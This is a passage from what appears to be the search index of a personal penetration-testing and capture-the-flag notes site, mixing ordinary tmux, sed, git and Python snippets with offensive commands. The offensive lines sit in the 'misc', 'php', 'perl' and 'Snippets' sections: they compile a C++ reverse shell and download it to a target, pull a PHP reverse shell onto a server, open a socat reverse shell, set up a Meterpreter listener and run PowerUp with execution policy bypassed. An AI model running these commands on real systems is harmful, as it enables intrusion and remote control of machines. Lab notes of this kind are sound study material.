only the \"signature\":</p> <pre><code>curl -s http://localhost:81/debug|jq '.response.Signature'\n\"81a6de30aab520f5588893222900f871f06a8be8b2091a1f151957eb423553274afb9530c14d37205dce12117f86a867f0f56822d1dfe63c981b737a79be42011fb3947f3f93dbcf020d2671806686113dc96ad0bd9d747ad6bb906daf97f0af\"\n</code></pre> <p>https://stedolan.github.io/jq/manual/ https://stedolan.github.io/jq/tutorial/</p>"},{"location":"miscellaneous/markdown/","title":"Markdown","text":"<p>https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet</p>"},{"location":"miscellaneous/misc/","title":"Miscellaneous stuff to be sorted later","text":"<p>Powershell Create result.zip from the entire Test folder:</p> <pre><code>Compress-Archive -Path C:\\Test -DestinationPath C:\\result\n</code></pre> <p>Powershell Extract the content of result.zip in the specified Test folder:</p> <pre><code>Expand-Archive -Path result.zip -DestinationPath C:\\Test\n</code></pre> <p>Windows - view encrypted files/folders</p> <pre><code>cipher /U /N\n</code></pre> <p>Windows Events Command Line Utility.</p> <pre><code>wevtutil /?\n</code></pre> <p>I used a c++ shell https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/ https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp</p> <p>compile:</p> <pre><code>i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc\n</code></pre> <p>Copy to box: Invoke-WebRequest -Uri http://10.10.14.25/prometheus.exe -OutFile C:\\Users\\Alfred\\AppData\\Local\\Temp\\prometheus.exe</p>"},{"location":"miscellaneous/misc/#convert-outlook-pst-personal-folders-to-mbox-file","title":"Convert outlook PST (personal folders) to mbox file","text":"<pre><code>readpst -rS alfred@arkham.local.ost\n</code></pre> <p>Deleting lines from file</p> <pre><code># To remove the line and print the output to standard out:\nsed '/pattern to match/d' ./infile\n\n# To directly modify the file:\nsed -i '/pattern to match/d' ./infile\n\n# To directly modify the file (and create a backup):\nsed -i.bak '/pattern to match/d' ./infile\n\n# For Mac OS X and FreeBSD users:\nsed -i '' '/pattern/d' ./infile\n</code></pre> <p>search bash_history for most used commands</p> <pre><code>sort ~/.bash_history |uniq -c|sed -e 's/^[[:space:]]*//'|sort -n\n</code></pre> <p>weather:</p> <pre><code>curl wttr.in/\n\ncurl wttr.in/&lt;CityName&gt;\n\ncurl wttr.in/:help\n\n# https://github.com/chubin/wttr.in\n</code></pre> <p>get current directory basename</p> <pre><code>result=${PWD##*/}          # to assign to a variable\n\nprintf '%s\\n' \"${PWD##*/}\" # to print to stdout\n# ...more robust than echo for unusual names\n#    (consider a directory named -e or -n)\n\nprintf '%q\\n' \"${PWD##*/}\" # to print to stdout, quoted for use as shell input\n# ...useful to make hidden characters readable.\n</code></pre>"},{"location":"miscellaneous/perl/","title":"Perl","text":""},{"location":"miscellaneous/perl/#download-file-via-perl","title":"Download file via perl","text":"<pre><code>perl -e 'use File::Fetch; my $url = \"http://10.10.14.22/LinEnum.sh\"; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;'\n</code></pre>"},{"location":"miscellaneous/php/","title":"Php","text":""},{"location":"miscellaneous/php/#get-and-save-file-from-website","title":"get and save file from website","text":"<pre><code>file_put_contents(\"boom.php\", fopen(\"http://10.10.14.25/php-reverse-shell.php\", 'r'));\nfile_put_contents(\"d9e28afcf0b274a5e0542abb67db0784/boom.php\", fopen(\"http://MY-IP-ADDRESS/php-reverse-shell.php\", 'r'));\n</code></pre>"},{"location":"miscellaneous/regular_expressions/","title":"Regular Expressions","text":"Type Syntax Positive lookahead q(?=u) Negative lookahead q(?!u) Positive lookbehind (?&lt;=a)b Negative lookbehind (?&lt;!a)b empty lines ^(?:[\\t ]*(?:\\r?\\n lines don't contain text ^((?!TEXT).)*$\\n trailing spaces <code>[ \\t]+$</code>"},{"location":"miscellaneous/tmux/","title":"Tmux","text":""},{"location":"miscellaneous/tmux/#tmux-shortcust-cheatsheet","title":"tmux shortcust &amp; cheatsheet","text":"<p>Start new:</p> <pre><code>tmux\n</code></pre> <p>start new with session name:</p> <pre><code>tmux new -s myname\n</code></pre> <p>attach</p> <pre><code>tmux a\ntmux at\ntmux attach\n</code></pre> <p>attach to named</p> <pre><code>tmux a -t myname\n</code></pre> <p>list sessions</p> <pre><code>tmux ls\n</code></pre> <p>kill session</p> <pre><code>tmux kill-session -t myname\n</code></pre> <p>kill all tmux sessions:</p> <pre><code>tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill\n</code></pre> <p>The default <code>&lt;prefix&gt;</code> is <code>ctrl+b</code></p>"},{"location":"miscellaneous/tmux/#sessions","title":"Sessions:","text":"keystroke command <code>&lt;prefix&gt; :new</code> new session <code>&lt;prefix&gt; s</code> list sessions <code>&lt;prefix&gt; $</code> name session"},{"location":"miscellaneous/tmux/#windows","title":"Windows:","text":"keystroke command <code>&lt;prefix&gt; c</code> create window <code>&lt;prefix&gt; w</code> list window <code>&lt;prefix&gt; n</code> next window <code>&lt;prefix&gt; p</code> previous window <code>&lt;prefix&gt; f</code> find window <code>&lt;prefix&gt; ,</code> name window <code>&lt;prefix&gt; &amp;</code> kill window"},{"location":"miscellaneous/tmux/#panes","title":"Panes:","text":"keystroke command <code>&lt;prefix&gt; %</code> vertical split <code>&lt;prefix&gt; \"</code> horizontal split <code>&lt;prefix&gt; o</code> swap panes <code>&lt;prefix&gt; q</code> show pane numbers <code>&lt;prefix&gt; x</code> kill pane <code>&lt;prefix&gt; +</code> break pane into window <code>&lt;prefix&gt; -</code> restore pane from window <code>&lt;prefix&gt; &lt;space&gt;</code> toggle between layouts <code>&lt;prefix&gt; {</code> move current pane left <code>&lt;prefix&gt; }</code> move current pane right <code>&lt;prefix&gt; z</code> toggle pane zoom"},{"location":"miscellaneous/Python/","title":"Python","text":"<p>pseudo shell:</p> <pre><code>from cmd import Cmd\nfrom colorama import Fore, Back, Style\n\nclass Terminal(Cmd):\n    # prompt = '&gt;&gt;&gt; '\n    # prompt = '\\033[91m&gt;&gt;&gt; \\033[00m'\n    prompt = Fore.RED +'&gt;&gt;&gt; ' + Fore.RESET\n\n    def default(self, args):\n        # do stuff\n        Pass\n\nterm = Terminal()\nterm.cmdloop()\n</code></pre>"},{"location":"miscellaneous/Python/#httplib-request","title":"HTTPLib request","text":"<pre><code>import httplib\ncon = httplib.HTTPConnection('challenge02.root-me.org', 60005)\ncon.request('GET', '/', headers = {'header_name': 'header_value'}\ncon.getresponse().read()\n</code></pre>"},{"location":"miscellaneous/Python/#python-get-character-blacklisted-input","title":"Python - get \".\" character (blacklisted input)","text":"<pre><code>repr(float(2/3))[1]\n</code></pre>"},{"location":"miscellaneous/Python/#string-manipulation","title":"String Manipulation","text":"<p>Take groups of n characters from a string</p> <pre><code>txt = \"ABCDEFGHI\"\nn = 3\nlistofnums = [txt[i:i+n] for i in range(0, len(txt), n)]\n</code></pre>"},{"location":"miscellaneous/Python/#ipython","title":"IPython","text":""},{"location":"miscellaneous/Python/#logging","title":"Logging","text":"<p>Turning logging on/off:</p> <pre><code>%logstart\n\n%logstop\n</code></pre> <p>https://stackoverflow.com/questions/16858724/how-to-log-ipython-history-to-text-file</p> <p>https://ipython.org/ipython-doc/rel-0.10.2/html/interactive/tutorial.html</p> <p>Read lines from file and remove newlines:</p> <pre><code>with open('filename', 'r') as file:\n    temp = file.read().splitlines()\n</code></pre> <p>Convert integer to binary (as string):</p> <pre><code>\"{0:b}\".format(25)\n</code></pre> <p>Bit Counting:</p> <p>Write a function that takes an integer as input, and returns the number of bits that are equal to one in the binary representation of that number. You can guarantee that input is non-negative.</p> <p>Example: The binary representation of 1234 is 10011010010, so the function should return 5 in this case</p> <pre><code>def countBits(n):\n    # use format to convert integer to binary\n    # then use list comprehension to sum the digits\n    return sum([int(x) for x in '{0:0b}'.format(n)])\n</code></pre> <p>Solutions from others:</p> <pre><code>def countBits(n):\n    return bin(n).count(\"1\")\n</code></pre> <pre><code>\" \".join([str(ord(x) % 97 + 1) for x in \"He\".lower() if x.isalpha()])\n</code></pre> <p>import string string.ascii_letters string.ascii_lowercase</p> <p>Given an array, find the int that appears an odd number of times.</p> <p>There will always be only one integer that appears an odd number of times.</p> <pre><code>a = [20,1,-1,2,-2,3,3,5,5,1,2,4,20,4,-1,-2,5]\n\nimport operator\ndef find_it(xs):\n    return reduce(operator.xor, xs)\n\ndef find_it_2(xs):\n    return [x for x in xs if xs.count(x) % 2 == 1][0]\n\ndef find_it_2(xs):\n    reduce((lambda x,y: x^y), xs)\n</code></pre> <p>md5 of text:</p> <pre><code>import hashlib\n\ndef pass_hash(str):\n    return hashlib.md5(str.encode()).hexdigest()\n</code></pre> <p>convert list of numbers into phone number format</p> <pre><code>def create_phone_number(n):\n    b = ''.join(map(str,n))\n    return f'({b[0:3]}) {b[3:6]}-{b[6:]}'\n\ndef create_phone_number(n):\n  return \"({}{}{}) {}{}{}-{}{}{}{}\".format(*n)\n</code></pre> <p>Count the number of Duplicates Write a function that will return the count of distinct case-insensitive alphabetic characters and numeric digits that occur more than once in the input string. The input string can be assumed to contain only alphabets (both uppercase and lowercase) and numeric digits.</p> <pre><code>def duplicate_count(text):\nreturn len(set([i for i in map((lambda x: chr(x).lower()), range(48,91)) if text.lower().count(i) &gt; 1]))\n    return len([chr(i) for i in range(48,123) if text.count(chr(i)) &gt; 1])\n\ndef duplicate_count(s):\n  return len([c for c in set(s.lower()) if s.lower().count(c)&gt;1])\n</code></pre> <p>Playing with digits Given a positive integer n written as abcd... (a, b, c, d... being digits) and a positive integer p</p> <p>we want to find a positive integer k, if it exists, such as the sum of the digits of n taken to the successive powers of p is equal to k * n. In other words:</p> <p>Is there an integer k such as : (a ^ p + b ^ (p+1) + c ^(p+2) + d ^ (p+3) + ...) = n * k</p> <p>If it is the case we will return k, if not return -1.</p> <pre><code>def dig_pow(n, p):\n    x,y = divmod(sum([int(b)**(a+p) for a,b in enumerate(str(n))]), n)\n    if y == 0:\n        return x\n    else:\n        return -1\n</code></pre> <p>Build Tower by the following given argument: number of floors (integer and always greater than 0). Tower block is represented as *</p> <p>example 6 level tower: [   '     *     ',   '        ',   '      ',   '  *  ',   ' * ',   '*****' ]</p> <pre><code>def tower_builder(n_floors):\n    return [(\"*\"*(2*i-1)).center(2*n_floors-1) for i in range(1, n_floors+1)]\n</code></pre> <pre><code>def int2romannumeral(n):\n    ints = (1000, 900,  500, 400, 100,  90, 50,  40, 10,  9,   5,  4,   1)\n    nums = ('M',  'CM', 'D', 'CD','C', 'XC','L','XL','X','IX','V','IV','I')\n    result = \"\"\n    for i in range(len(ints)):\n       count = n // ints[i]\n       result += nums[i] * count\n       n -= ints[i] * count\n    return result\n</code></pre> <p>from functools import reduce product = reduce((lambda x, y: x * y), [1, 2, 3, 4])</p> <p>A child is playing with a ball on the nth floor of a tall building. The height of this floor, h, is known.</p> <p>He drops the ball out of the window. The ball bounces (for example), to two-thirds of its height (a bounce of 0.66).</p> <p>His mother looks out of a window 1.5 meters from the ground.</p> <p>How many times will the mother see the ball pass in front of her window (including when it's falling and bouncing?</p> <p>Three conditions must be met for a valid experiment: Float parameter \"h\" in meters must be greater than 0 Float parameter \"bounce\" must be greater than 0 and less than 1 Float parameter \"window\" must be less than h. If all three conditions above are fulfilled, return a positive integer, otherwise return -1.</p> <p>Note: The ball can only be seen if the height of the rebounding ball is stricty greater than the window parameter.</p> <pre><code>from math import log\n\ndef bouncingBall(h, b, w):\n    return (2 * int(log(w / h, b)) + 1) if (h &gt; 0 and b &gt; 0 and b &lt; 1 and w &lt; h) else -1\n</code></pre>"},{"location":"miscellaneous/Python/python_server/","title":"Python web server examples","text":"<p>There is the \"Simple HTTP Server\" module that works well in a pinch:</p> <pre><code># python2\npython -m SimpleHTTPServer &lt;port&gt;\n\n# python3\npython3 -m http.server &lt;port&gt;\n</code></pre> <p>This script will log the requests to the console (including post bodies) source: https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7</p> <pre><code>#!/usr/bin/env python3\n\"\"\"\nVery simple HTTP server in python for logging requests\nUsage::\n    ./server.py [&lt;port&gt;]\n\"\"\"\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport logging\n\nclass S(BaseHTTPRequestHandler):\n    def _set_response(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        logging.info(\"GET request,\\nPath: %s\\nHeaders:\\n%s\\n\", str(self.path), str(self.headers))\n        self._set_response()\n        self.wfile.write(\"GET request for {}\".format(self.path).encode('utf-8'))\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length']) # &lt;--- Gets the size of data\n        post_data = self.rfile.read(content_length) # &lt;--- Gets the data itself\n        logging.info(\"POST request,\\nPath: %s\\nHeaders:\\n%s\\n\\nBody:\\n%s\\n\",\n                str(self.path), str(self.headers), post_data.decode('utf-8'))\n\n        self._set_response()\n        self.wfile.write(\"POST request for {}\".format(self.path).encode('utf-8'))\n\ndef run(server_class=HTTPServer, handler_class=S, port=8080):\n    logging.basicConfig(level=logging.INFO)\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    logging.info('Starting httpd...\\n')\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        pass\n    httpd.server_close()\n    logging.info('Stopping httpd...\\n')\n\nif __name__ == '__main__':\n    from sys import argv\n\n    if len(argv) == 2:\n        run(port=int(argv[1]))\n    else:\n        run()\n</code></pre>"},{"location":"miscellaneous/Python/python_to_sort/","title":"Python to sort","text":"<p>python -c \"from collections import OrderedDict; import os; print(':'.join(list(OrderedDict.fromkeys(os.environ['PATH'].split(':')))))\"</p> <p>import os</p> <p>os.chdir(\"/dev/shm\")</p> <p>os.getcwd()</p>"},{"location":"miscellaneous/Python/python_to_sort/#python-to-sort","title":"Python - to sort","text":""},{"location":"miscellaneous/Python/python_to_sort/#httpsstackoverflowcomquestions23384230how-to-post-multiple-value-with-same-key-in-python-requests","title":"https://stackoverflow.com/questions/23384230/how-to-post-multiple-value-with-same-key-in-python-requests","text":"<pre><code>requests.post(url, data=[('interests', 'football'), ('interests', 'basketball')])\nrequests.post(url, data={'interests': ['football', 'basketball']})\n</code></pre> <p>$ export FLASK_APP=hello.py $ python -m flask run --host=0.0.0.0</p> <p>Conda:</p> <pre><code>conda init\nconda config --set auto_activate_base false\nsource ~/.bashrc\n</code></pre> <p>https://stackoverflow.com/questions/43580/how-to-find-the-mime-type-of-a-file-in-python</p> <pre><code>from mimetypes import MimeTypes\nimport urllib\nmime = MimeTypes()\nurl = urllib.pathname2url('Upload.xml')\nmime_type = mime.guess_type(url)\nprint mime_type\n\nmime.from_buffer(file_contents)\n</code></pre> <p>https://stackoverflow.com/questions/3002085/python-to-print-out-status-bar-and-percentage</p> <pre><code># list outdated python packages\npip3 list --outdated\n\n# auto update all outdated python packages\npip3 list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U\n</code></pre> <pre><code>def single_char_xor(input_bytes, char_value):\n    output_bytes = b''\n    for byte in input_bytes:\n        output_bytes += bytes([byte ^ char_value])\n    return output_bytes, char_value\n</code></pre> <pre><code>import binascii\n\nx = \"100001101101011010000011011010100101011000011001101110001000100101100010100111010000100000110101101001011100111010001001001110100100001101101000001101011110010111001011\"\n\ndef splitCount(s, count):\n    return [''.join(x) for x in zip(*[list(s[z::count]) for z in range(count)])]\n</code></pre> <p>http://urwid.org/ - Console user interface library for Python</p> <p>https://towardsdatascience.com/progress-bars-in-python-4b44e8a4c482</p> <p>https://www.quora.com/How-can-I-delete-the-last-printed-line-in-Python-language</p> <pre><code>CURSOR_UP_ONE = '\\x1b[1A'\nERASE_LINE = '\\x1b[2K'\n\nimport sys\nsys.stdout.write(CURSOR_UP_ONE)\nsys.stdout.write(ERASE_LINE)\n\n\ndef delete_last_lines(n=1):\n    for _ in range(n):\n        sys.stdout.write(CURSOR_UP_ONE)\n        sys.stdout.write(ERASE_LINE)\n</code></pre> <p>https://stackoverflow.com/questions/5419389/how-to-overwrite-the-previous-print-to-stdout-in-python * http://en.wikipedia.org/wiki/ANSI_escape_code * https://www.youtube.com/watch?v=WAitSilLDUA</p> <pre><code>print('\\x1b[2K\\r'),\n</code></pre> <p>pip3 install flake8 atom: * python-indent * busy-signal * intentions * linter * linter-flake8 * linter-ui-default * sort-lines</p> <p>https://stackoverflow.com/questions/3002085/python-to-print-out-status-bar-and-percentage</p> <pre><code>import progressbar\nfrom time import sleep\n\nbar = progressbar.ProgressBar(maxval=20,\n                              widgets=[progressbar.Bar('=', '[', ']'), ' ',\n                                       progressbar.Percentage()],\n                              term_width=80)\n\nbar.start()\n\nfor i in range(20):\n    bar.update(i + 1)\n    sleep(0.1)\n\nbar.finish()\n</code></pre> <pre><code>from time import sleep\nimport sys\n\nCURSOR_UP_ONE = '\\x1b[1A'\nERASE_LINE = '\\x1b[2K'\n\nfor i in range(41):\n    sys.stdout.write('\\r')\n    print(f\"testing: {i}\", end=\"\")\n    if i in (5, 15, 33):\n        sys.stdout.write('\\r')\n        print(f\"found one!: {i}\")\n    sleep(0.15)\n    sys.stdout.write('\\r')\n    sleep(0.15)\n    sys.stdout.write(ERASE_LINE)\n</code></pre> <p>Pretty Print</p> <pre><code>#!/usr/bin/env python3\n\nfrom termcolor import cprint\nimport time\n\noutput = \"\"\nprogress = \"\"\n\n\ndef beautify_print_try(value):\n    global output\n    print(\"\\033c\")\n    cprint(output, 'green', attrs=['bold'])\n    cprint('[*] Try: ' + value, 'red', attrs=['bold'])\n\n\ndef beautify_print():\n    global output\n    print(\"\\033c\")\n    cprint(output, 'green', attrs=['bold'])\n\n\ndef doit():\n    global output\n    for i in range(100):\n        if i in (10, 40, 80):\n            output = output + \"\\n\" + str(i)\n        beautify_print_try(str(i))\n        time.sleep(0.01)\n\n\ndoit()\nbeautify_print()\ndoit()\nbeautify_print()\n</code></pre> <p>ipython - History:</p> <pre><code>%history [-n] [-o] [-p] [-t] [-f FILENAME] [-g [PATTERN [PATTERN ...]]]\n             [-l [LIMIT]] [-u]\n             [range [range ...]]\n\nPrint input history (_i&lt;n&gt; variables), with most recent last.\n\nBy default, input history is printed without line numbers so it can be\ndirectly pasted into an editor. Use -n to show them.\n\nBy default, all input history from the current session is displayed.\nRanges of history can be indicated using the syntax:\n\n``4``\n  Line 4, current session\n``4-6``\n  Lines 4-6, current session\n``243/1-5``\n  Lines 1-5, session 243\n``~2/7``\n  Line 7, session 2 before current\n``~8/1-~6/5``\n  From the first line of 8 sessions ago, to the fifth line of 6\n  sessions ago.\n\nMultiple ranges can be entered, separated by spaces\n\nThe same syntax is used by %macro, %save, %edit, %rerun\n\nExamples\n--------\n::\n\nIn [6]: %history -n 4-6\n4:a = 12\n5:print a**2\n6:%history -n 4-6\n</code></pre> <p>python -m pyftpdlib -p 21 -w -d <code>pwd</code> -i 10.10.14.25</p>"},{"location":"miscellaneous/Python/requests_and_beautifulsoup/","title":"Requests and beautifulsoup","text":""},{"location":"miscellaneous/Python/requests_and_beautifulsoup/#extracting-token-from-within-html-response","title":"extracting token from within html response","text":"<pre><code>&lt;input type=\"hidden\" name=\"token\" value=\"a1619cf7cdb1e88230bf406438aa41fdc403dff31967f513f359259f99560afc\" /&gt;\n</code></pre> <pre><code>import requests\nfrom bs4 import BeautifulSoup\nurl = \"http://10.10.10.XX\"\ncookies = { 'PHPSESSID': 'Cookie_value' }\ns = requests.session()\n\ndef getToken():\n    r = s.get(url, cookies=cookies)\n    soup = BeautifulSoup(r.content, \"html.parser\")\n    return soup.find(\"input\", {\"name\":\"token\"})[\"value\"]\n</code></pre> <p>BeautifulSoup - find element with given class:</p> <pre><code>mydivs = soup.findAll(\"div\", {\"class\": \"stylelistrow\"})\n</code></pre>"},{"location":"miscellaneous/Python/requests_and_beautifulsoup/#use-raw_input-to-take-user-input-without-having-to-use-quotes","title":"use raw_input to take user input (without having to use quotes)","text":"<pre><code>while True:\n    x = raw_input(\"&gt;&gt;&gt; \")\n    # DO ALL THE STUFF\n</code></pre>"},{"location":"miscellaneous/Python/requests_and_beautifulsoup/#url-encoding-a-string","title":"url encoding a string","text":"<pre><code>import urllib\nurllib.quote(string_to_encode)\n</code></pre>"},{"location":"miscellaneous/Python/requests_and_beautifulsoup/#suppress-insecurerequestwarning-from-within-requets","title":"Suppress InsecureRequestWarning from within requets","text":"<pre><code>from requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/","title":"Snippets","text":""},{"location":"miscellaneous/to_sort/Snippets/#get-tab-auto-completion-in-reverse-shell","title":"Get tab auto-completion in reverse shell","text":"<pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\");'     # python3 -c 'import pty; pty.spawn(\"/bin/bash\");'\n# ^Z (background shell with ctrl+z)\nstty raw -echo\nfg      #(to foreground the shell)\nstty rows 45 cols 205\n\n#### Fix TERM variable to allow clear\nexport TERM=xterm-256color\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#another-nmap-approach","title":"Another nmap approach","text":"<p>nmap -F 10.10.10.22 #find ports nmap -A -p22,80,443 10.10.10.22 #scan those ports</p>"},{"location":"miscellaneous/to_sort/Snippets/#metasploit-listener","title":"Metasploit Listener","text":"<pre><code># unicorn.rc\nuse multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 10.10.14.22\nset LPORT 1337\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n\nmsfconsole -r unicorn.rc\n</code></pre> <pre><code>export IP_ADR=\"10.10.10.40\"\ncd ~/Documents/htb/boxes/\n\ntmux\nopenvpn /root/Documents/htb/Glasgow.ovpn\n\n#tmux new-window -c \"#{pane_current_path}\"\n\nnmap -sC -sV -oA nmap $IP_ADR\n\nnmap -T4 -A -v $IP_ADR\n\nuniscan -u $IP_ADR -qweds\n\ndirb http://$IP_ADR /usr/share/wordlists/dirb/common.txt -o dirb_output.txt\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#socat-commands","title":"Socat Commands","text":"<pre><code># listener\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\nsocat file:`tty`,raw,echo=0 tcp-listen:4447,reuseaddr\n\n# port forward\nsocat TCP-LISTEN:9992,fork TCP:10.10.14.22:9992 &amp;\n\n# reverse shell\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.19.0.4:9992 &amp;\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#ssh-port-forwarding","title":"ssh port forwarding","text":"<p>https://www.ssh.com/ssh/tunneling/example</p> <pre><code>ssh -L &lt;localport&gt;:&lt;remote_address_to_forward_to&gt;:&lt;remote_port&gt; user@ssh-ip-address\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#remove-1st-line-from-output","title":"Remove 1st line from output","text":"<pre><code>sed '1d' file.txt &gt; tmpfile; mv tmpfile file.txt # POSIX\nsed -i '1d' file.txt # GNU sed only, creates a temporary file\n\nperl -ip -e '$_ = undef if $. == 1' file.txt # also creates a temporary file\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#connecting-to-mysql-database-extracting-wp-hashes","title":"connecting to mysql database &amp; extracting wp hashes","text":"<pre><code>mysql --host=HOSTNAME --user=USERNAME --password=PASSWORD\n\nuse wp\nselect concat_ws(':', user_login, user_pass) from wp_users;\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#run-powershell-script-function-from-cmd","title":"run powershell script function from cmd","text":"<pre><code>powershell.exe -exec bypass -Command \"&amp; {Import-Module C:\\Users\\mssql-svc\\Desktop\\PowerUp.ps1; Invoke-AllChecks}\"\n</code></pre>"},{"location":"miscellaneous/to_sort/Snippets/#use-impacket-smbserver-to-send-files-to-box","title":"Use impacket-smbserver to send files to box:","text":"<pre><code>impacket-smbserver -smb2support files `pwd`\n\nxp_cmdshell xcopy \\\\10.10.14.25\\files\\PowerUp.ps1 C:\\Users\\mssql-svc\\Desktop\\\n</code></pre>"},{"location":"miscellaneous/to_sort/atom_to_sort/","title":"Atom to sort","text":"<pre><code>root@kali:~# apm list --installed --bare\nHydrogen@2.8.0\natom-beautify@0.33.4\nautocomplete-python@1.14.0\nbusy-signal@2.0.1\ndocblock-python@0.16.0\nfile-icons@2.1.32\nhighlight-selected@0.16.0\nhydrogen-python@0.0.8\nintentions@1.1.5\nlinter@2.3.1\nlinter-flake8@2.4.0\nlinter-ui-default@1.8.0\nminimap@4.29.9\nminimap-highlight-selected@4.6.1\nopen-recent@5.0.0\npdf-view@0.72.0\npython-indent@1.2.5\nseti-ui@1.11.0\nsort-lines@0.19.0\n</code></pre> <p>Setting up the python3 kernel: * https://nteract.io/kernels</p> <pre><code>python3 -m pip install ipykernel\npython3 -m ipykernel install\n</code></pre>"},{"location":"miscellaneous/to_sort/git_to_sort/","title":"Git to sort","text":"<p>Example repository running Actions https://github.com/actions/toolkit/actions</p> <p>Example workflow file: https://github.com/actions/toolkit/blob/master/.github/workflows/</p> <p>GitHub stuff:</p> <pre><code>git remote update\n\n\nCheck if pull needed in Git\ngit status -uno\ngit show-branch *master\n</code></pre>"},{"location":"miscellaneous/to_sort/git_to_sort/#github","title":"Github","text":"<p>force pull from master</p> <pre><code>git fetch --all\ngit reset --hard origin/master\n</code></pre> <p>delete all commit history in github:</p> <pre><code># Checkout\ngit checkout --orphan latest_branch\n\n# Add all the files and commit them\ngit add -A\ngit commit\n\n# Delete the master branch\ngit branch -D master\n\n# Rename the current branch to master\ngit branch -m master\n\n# Finally, force update your repository\ngit push -f origin master\n\n# remove the old files\ngit gc --aggressive --prune=all\n\n# set tracking information\ngit branch --set-upstream-to=origin/master master\n</code></pre> <p>Git config stuff</p> <pre><code>git config --global user.name \"username\"\ngit config --global user.email \"email\"\ngit config --global color.ui \"auto\"\n</code></pre> <p>git clone a wiki page https://gist.github.com/subfuzion/0d3f19c4f780a7d75ba2 Clone a github wiki</p> <p>See file as of a given commit: https://stackoverflow.com/questions/338436/how-can-i-view-an-old-version-of-a-file-with-git</p> <pre><code>git show REVISION:path/to/file\n\n# Replace REVISION with your actual revision (could be a Git commit SHA, a tag name, a branch name, a relative commit name, or any other way of identifying a commit in Git)\n</code></pre>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/","title":"Misc to be sorted","text":"<p>https://laptophackingcoffee.org/doku.php?id=wiki:resources https://laptophackingcoffee.org/doku.php?id=wiki:starthacking https://ctf.laptophackingcoffee.org/challenges</p> <p>https://stackoverflow.com/questions/14204230/how-to-list-the-files-in-a-zip-in-powershell</p> <p>Enumeration: http://virgil-cj.blogspot.com/2018/02/enumeration-is-key_6.html</p> <p>https://github.com/Alamot/code-snippets</p> <p>https://github.com/ben0/Offsec-stuff https://ired.team/</p> <p>https://xapax.gitbooks.io/security/content/find_subdomains.html</p> <p>How to Create a List of Your Installed Programs on Windows</p> <p><code>Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table \u2013AutoSize</code></p> <p>Find files containing a string:</p> <pre><code>Select-String -Path \"*.backup\" -Pattern 'Administrator'\n</code></pre> <p>Kill Process</p> <pre><code>Stop-Process -Name \"notepad\" -Force\n</code></pre> <p>pip3 install pydes</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#links","title":"Links:","text":"<p>https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html https://xapax.gitbooks.io/security/content/bash-scripting.html * https://github.com/xapax/security * https://github.com/xapax https://log.cyconet.org/2004/10/19/reread-the-mysql-privileges/ https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#netsec-ramblings-of-a-netsec-addict","title":"NETSEC - Ramblings of a NetSec addict","text":"<p>https://netsec.ws/</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#fully-interactive-shells","title":"Fully interactive shells","text":"<p>https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://netsec.ws/?p=337 https://www.reddit.com/r/netsec/comments/6mcbp7/upgrading_shells_to_fully_interactive_ttys/</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#firewalls","title":"Firewalls","text":"<p>https://www.howtogeek.com/177621/the-beginners-guide-to-iptables-the-linux-firewall/ https://www.thegeekstuff.com/2011/06/iptables-rules-examples/?utm_source=feedburner https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#socat","title":"socat","text":"<p>https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/ http://technostuff.blogspot.com/2008/10/some-useful-socat-commands.html</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#grep","title":"grep","text":"<p>https://stackoverflow.com/questions/10346816/using-grep-to-search-for-a-string-that-has-a-dot-in-it</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#linux-directory-size-du","title":"Linux directory size (du)","text":"<p>https://www.tecmint.com/check-linux-disk-usage-of-files-and-directories/</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#linux-groups-also-in-readme","title":"Linux groups (also in 